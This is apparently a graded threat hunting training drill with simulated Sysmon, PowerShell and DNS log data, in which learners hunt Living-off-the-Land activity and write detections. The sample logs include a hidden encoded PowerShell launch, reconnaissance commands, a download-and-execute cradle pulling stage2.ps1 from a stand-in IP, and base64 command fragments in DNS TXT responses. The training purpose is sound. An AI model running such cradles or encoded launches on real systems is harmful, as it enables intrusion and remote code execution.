# Drill 01 (Intermediate): Conducting a Data-Driven Threat Hunt

**Level:** Intermediate

**Estimated Time:** 90-120 minutes

**Submission Format:** Hunt report (Markdown or PDF) with queries and analysis

---

## Learning Objectives

* Apply statistical analysis techniques to identify anomalies in log data
* Conduct a data-driven hunt using stack counting and frequency analysis
* Write and execute hunting queries in a SIEM
* Analyze results to distinguish true positives from false positives
* Document a complete hunt with metrics

---

## Scenario

You are a threat hunter at **TechManu Corp**, a manufacturing company.
No active threat intelligence is available today, so you will conduct a **data-driven hunt** starting from the data itself rather than a specific threat actor hypothesis.

Your security team has noticed that the company has not been formally hunted for **Living-off-the-Land (LotL) techniques** — where attackers use legitimate Windows tools to avoid detection.
This is your hunting target.

You have access to:

* **Sysmon logs** (deployed on 800 workstations, 120 servers)
* **Windows Security Event Logs**
* **Network proxy logs**
* **DNS query logs**

---

## Dataset: Simulated Log Events

Since this is a training drill, use the following simulated log data.
Analyze these events as if they were real SIEM results.

### Dataset A: Process Creation Events (Last 30 Days, Sorted by Frequency)

This table represents the results of a **stack count** query across all workstations:

```text
Parent Process      | Child Process      | Count  | % of Hosts
--------------------|--------------------|--------|------------
explorer.exe        | chrome.exe         | 89,420 | 99.8%
svchost.exe         | rundll32.exe       | 45,230 | 98.1%
explorer.exe        | WINWORD.EXE        | 38,891 | 87.4%
services.exe        | svchost.exe        | 30,124 | 100%
userinit.exe        | explorer.exe       | 28,445 | 99.9%
explorer.exe        | EXCEL.EXE          | 22,156 | 76.3%
WINWORD.EXE         | WINWORD.EXE        | 18,940 | 43.2%  [child launching]
taskeng.exe         | msiexec.exe        | 12,445 | 55.2%
explorer.exe        | cmd.exe            |  4,891 | 23.4%
explorer.exe        | powershell.exe     |  2,340 | 15.6%
svchost.exe         | conhost.exe        |  1,890 | 78.4%
taskeng.exe         | powershell.exe     |  1,240 | 11.2%
cmd.exe             | net.exe            |    892 |  8.9%
msiexec.exe         | rundll32.exe       |    678 | 21.3%
OUTLOOK.EXE         | cmd.exe            |     45 |  4.2%   [!]
OUTLOOK.EXE         | powershell.exe     |     23 |  2.1%   [!]
wscript.exe         | cmd.exe            |     18 |  1.4%   [!]
wscript.exe         | powershell.exe     |      8 |  0.7%   [!]
mshta.exe           | powershell.exe     |      4 |  0.3%   [!]
WINWORD.EXE         | cmd.exe            |      3 |  0.4%   [!]
svchost.exe         | cmd.exe            |      3 |  0.3%   [!]
regsvr32.exe        | cmd.exe            |      2 |  0.2%   [!]
mshta.exe           | cmd.exe            |      1 |  0.1%   [!]
WINWORD.EXE         | powershell.exe     |      1 |  0.1%   [!!]
```

### Dataset B: PowerShell Command Lines (Unusual Arguments)

Sample of unusual PowerShell executions found in Sysmon logs:

```text
Event #1:
Time: 2024-03-12 14:23:01
Host: PROD-WS-0412
User: tjones
Parent: WINWORD.EXE
CommandLine: powershell.exe -NoProfile -WindowStyle hidden -exec bypass -enc
             SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0
             ACAATQBJAFQAQQBDAE8ATQAuAFMAaABlAGwAbAAuAEEAcABwAGwAaQBjAGEAdABpAG8AbgApAC4A
             UQBVAFQATQA=
Network: Connected to 198.51.100.88:443 (5 seconds after launch)

Event #2:
Time: 2024-03-12 14:28:33
Host: PROD-WS-0412
User: tjones
Parent: powershell.exe (from Event #1)
CommandLine: cmd.exe /c whoami & net user & net localgroup administrators
Network: No network connection

Event #3:
Time: 2024-03-12 15:02:11
Host: PROD-WS-0412
User: tjones
Parent: powershell.exe (from Event #1)
CommandLine: powershell.exe -NoProfile -Command
             "IEX (New-Object Net.WebClient).DownloadString('https://198.51.100.88/stage2.ps1')"
Network: Connected to 198.51.100.88:443

Event #4:
Time: 2024-03-10 09:15:44
Host: FIN-WS-0023
User: asmith
Parent: OUTLOOK.EXE
CommandLine: powershell.exe -ExecutionPolicy RemoteSigned
             -File "C:\Users\asmith\AppData\Temp\invoice_automation.ps1"
Network: No network connection (script ran for 3 minutes, exited normally)

Event #5:
Time: 2024-03-15 11:44:02
Host: DEV-WS-0055
User: bchen
Parent: explorer.exe
CommandLine: powershell.exe -NoProfile -NonInteractive
             -Command "Import-Module Az; Connect-AzAccount"
Network: Connected to 40.126.x.x:443 (Microsoft Azure)
```

### Dataset C: Network Anomalies

DNS query statistics for last 30 days:

```text
Host          | Total DNS Queries | TXT Queries | Unique Domains | Avg Query/Day
--------------|-------------------|-------------|----------------|---------------
CORP-WS-*     | ~1,200-1,800      | 0-5         | 150-280        | 40-60
SERVER-*      | ~3,000-5,000      | 0-10        | 200-400        | 100-167
PROD-WS-0412  | 28,441            | 892         | 2,410          | 948  [!!]
FIN-WS-0023   | 1,580             | 3           | 165            | 53   [normal]
DEV-WS-0055   | 2,240             | 12          | 320            | 75   [normal]
```

DNS query samples from PROD-WS-0412:

```text
198.51.100.88.in-addr.arpa TXT → (empty response)
a1b2.telemetry-collect.io   TXT → "Y2QgL3RtcC8gJiYgbHMgLWxh..."
f3g4.telemetry-collect.io   TXT → "cGluZyAxOTguNTEuMTAwLjg4..."
x9y8.telemetry-collect.io   TXT → "bmV0IHVzZXIgL2RvbWFpbg==..."
(892 similar queries in 24-hour period to *.telemetry-collect.io)
```

---

## Tasks

### Task 1: Stack Count Analysis (20 points)

Using Dataset A:

1. Identify all parent-child process relationships that are suspicious or potentially malicious. Mark each with a threat level (Low/Medium/High/Critical).

1. For each suspicious relationship, explain:
   * Why is this relationship suspicious?
   * What ATT&CK technique might this represent?
   * What is the likely legitimate explanation (if any)?

1. Prioritize the top 3 relationships you would investigate first, and justify your selection.

---

### Task 2: PowerShell Investigation (30 points)

Analyze Events #1 through #5 from Dataset B:

For each event:
a) Is it suspicious, benign, or unclear?
Explain your reasoning.
b) What additional evidence would you gather to confirm or deny malicious activity?
c) If suspicious, what ATT&CK technique(s) are represented?

For Events #1-3 (which appear related):
d) Reconstruct what likely happened across these three events as a coherent narrative.
e) What is the likely severity?
What immediate action would you take?
f) Write one Sigma rule (YAML format) that would detect the behavior in Event #1.

---

### Task 3: DNS Anomaly Analysis (25 points)

Using Dataset C:

1. Describe what you observe about PROD-WS-0412's DNS behavior. Calculate:
   * What is the z-score of PROD-WS-0412's DNS query count vs. the peer average?
   * What percentage of DNS queries from this host are TXT type?
   * What does the high TXT query percentage suggest?

1. Analyze the sample DNS queries from PROD-WS-0412:
   * What do the subdomain names suggest?
   * Base64-decode the TXT record responses. What do they contain?
   * What attack technique does this represent?

1. Write a Splunk search query that would detect this anomaly across all hosts.

1. Explain how you would confirm whether this is malicious or a legitimate monitoring tool.

---

### Task 4: Hunt Report (25 points)

Write a complete hunt report covering:

1. **Executive Summary** (3-5 sentences): What was hunted, what was found, immediate risk level.

1. **Findings Summary Table**:

| Finding ID | System | Description | Severity | Status | Action |
|------------|--------|-------------|----------|--------|--------|

1. **Detailed Finding: PROD-WS-0412**
   * Full timeline of events
   * Evidence summary
   * Severity assessment
   * Recommended immediate action

1. **Data Coverage Assessment**:
   * What data sources worked well?
   * What gaps exist?
   * What monitoring improvements would help?

1. **New Detections Recommended** (at least 2):
   * What new SIEM rules or alerts should be created?

---

## Hints

* Base64 decode the TXT record responses to understand the C2 communication
* Connect the dots between Process (Dataset B) and DNS (Dataset C) data from PROD-WS-0412
* Consider the timestamps: Events #1, 2, 3 all occur on the same day
* Events #4 and #5 are independent; do not cross-contaminate your analysis

---

## Evaluation Criteria

| Task | Points | Key Criteria |
|------|--------|--------------|
| Task 1: Stack counting | 20 | Identifies all high-priority relationships, clear threat mapping |
| Task 2: PS investigation | 30 | Accurate analysis, good Sigma rule, correct severity assessment |
| Task 3: DNS anomaly | 25 | Correct calculations, technique identification, working query |
| Task 4: Hunt report | 25 | Complete, professional, actionable |
| **Total** | **100** | |
